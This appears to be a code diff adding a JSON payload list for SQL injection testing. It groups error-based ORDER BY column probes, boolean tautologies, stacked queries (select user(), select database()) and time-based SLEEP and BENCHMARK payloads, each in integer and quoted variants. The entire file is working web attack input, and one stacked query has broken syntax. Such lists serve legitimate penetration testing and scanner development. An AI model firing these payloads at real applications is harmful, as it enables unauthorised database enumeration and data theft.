@@ -1,0 +1,56 @@
+{
+  "error_based": {
+    "integer": [
+      "1 order by 3--+",
+      "1 order by 4--+",
+      "1 order by 5--+"
+    ],
+    "single_quote": [
+      "1' order by 3--+",
+      "1' order by 4--+",
+      "1' order by 5--+"
+    ],
+    "double_quote": [
+      "1\" order by 3--+",
+      "1\" order by 4--+",
+      "1\" order by 5--+"
+    ]
+  },
+  "boolean_based": {
+    "integer": [
+      "1 or 1=1--+",
+      "1 and 1=2--+"
+    ],
+    "single_quote": [
+      "1' or '1'='1--+",
+      "1' and '1'='2--+"
+    ],
+    "double_quote": [
+      "1\" or \"1\"=\"1--+",
+      "1\" and \"1\"=\"2--+"
+    ]
+  },
+  "stacked_query": {
+    "single_quote": [
+      "1'; select user();--+",
+      "1'; show databases();--+"
+    ],
+    "integer": [
+      "1; select database();--+"
+    ]
+  },
+  "time_based": {
+    "integer": [
+      "1 AND SLEEP(5)--+",
+      "1 AND BENCHMARK(5000000,MD5(1))--+"
+    ],
+    "single_quote": [
+      "1' AND SLEEP(5)--+",
+      "1' AND BENCHMARK(5000000,MD5(1))--+"
+    ],
+    "double_quote": [
+      "1\" AND SLEEP(5)--+",
+      "1\" AND BENCHMARK(5000000,MD5(1))--+"
+    ]
+  }
+}
